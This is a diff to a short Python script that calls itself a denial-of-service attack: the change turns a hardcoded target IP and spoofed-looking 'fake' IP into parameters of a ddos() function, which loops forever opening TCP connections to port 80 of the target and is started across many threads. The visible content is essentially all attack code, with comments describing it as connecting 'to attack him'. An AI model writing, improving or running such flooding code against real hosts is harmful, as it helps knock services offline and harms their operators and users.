@@ -2,10 +2,10 @@
 import socket
 import threading
 #the attack is very straightforward
-targetIP = '127.0.0.1'
-fakeIP = '182.21.20.32'
-port = 80
-def ddos():
+def ddos(target, fake):
+    targetIP = target
+    fakeIP = fake
+    port = 80
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #open a socket 
         s.connect((targetIP, port)) #connect to the targeted ip and port to attack him
@@ -18,3 +18,4 @@ for i in range(10):    #initiating many threads
      thread.start()
      print("Connection number",i)
 #initiating many threads
+
